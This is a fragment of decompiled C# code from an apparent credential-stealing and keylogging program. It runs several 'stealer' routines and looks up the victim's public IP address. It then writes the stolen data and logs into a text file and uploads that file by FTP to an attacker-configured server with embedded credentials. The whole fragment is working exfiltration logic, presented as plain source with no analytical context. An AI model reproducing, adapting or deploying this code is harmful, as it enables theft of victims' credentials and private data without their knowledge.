		if (Operators.CompareString(string_58, "true", false) == 0)
		{
			try
			{
				Class14.smethod_0();
				Class15.smethod_1();
				Class16.smethod_0();
				Class12.smethod_0();
				Class11.smethod_0();
				Class13.smethod_0();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				((TextBoxBase)vmethod_14()).AppendText("==== NOTHING TO STEAL ====\r\n");
				ProjectData.ClearProjectError();
			}
		}
		string @string = default(string);
		try
		{
			WebClient webClient = new WebClient();
			@string = Encoding.ASCII.GetString(webClient.DownloadData("http://whatismyip.com/automation/n09230945.asp"));
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		if (Operators.CompareString(string_3, "true", false) == 0 && !((Operators.CompareString(string_4, "", false) == 0) | (Operators.CompareString(string_5, "", false) == 0) | (Operators.CompareString(string_6, "", false) == 0)))
		{
			if (File.Exists(string_10 + string_1 + ".txt"))
			{
				((ServerComputer)Class1.smethod_0()).get_FileSystem().DeleteFile(string_10 + string_1 + ".txt");
			}
			string path = string_10 + string_1 + ".txt";
			string value = "IP Address :" + @string + "\r\n===== Stealers =====\r\n" + vmethod_14().get_Text() + "\r\n===== Logs =====\r\n" + vmethod_0().get_Text();
			StreamWriter streamWriter = new StreamWriter(path, append: true);
			streamWriter.Write(value);
			streamWriter.Close();
			try
			{
				FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create("ftp://" + string_4 + "/" + string_1 + ".txt");
				ftpWebRequest.Credentials = new NetworkCredential(string_5, string_6);
				ftpWebRequest.Method = "STOR";
				byte[] array = File.ReadAllBytes(string_10 + string_1 + ".txt");
				Stream requestStream = ftpWebRequest.GetRequestStream();
				requestStream.Write(array, 0, array.Length);
				requestStream.Close();
				requestStream.Dispose();
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}
	}
}
